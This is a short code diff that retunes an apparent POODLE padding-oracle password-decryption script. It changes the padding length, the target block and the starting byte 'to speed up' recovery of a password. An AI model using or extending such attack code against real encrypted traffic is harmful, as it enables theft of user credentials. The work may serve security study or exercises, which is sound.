@@ -11,10 +11,11 @@ ORIGIN_CLIENT = "C"
 ORIGIN_SEPARATOR = "-"
 RESPONSE_SUCCESSFUL = "ok\n"
 
-PADDING_LAMBDA = 13 # To make request end on block boundary
+PADDING_LAMBDA = 9 # To make request end on block boundary
 
 PADDING_CHAR = "a"
-DECRYPT_BLOCK_FROM_LAST = 5 # Decrypt the 5th block counting from last
+DECRYPT_BLOCK_FROM_LAST = 6 # Decrypt the 6th block counting from last
+PADDING_START = 5 # To speed up, start in the first byte of password
 
 
 class PoodlePasswordDecrypter:
@@ -31,7 +32,7 @@ class PoodlePasswordDecrypter:
 		self.csrf = raw_input()
 	
 	def try_loop(self):
-		padding_chars = 0
+		padding_chars = PADDING_START
 		while not self.got_password:
 			char = self.try_decipher_one_char(padding_chars)
 			if char is not None:
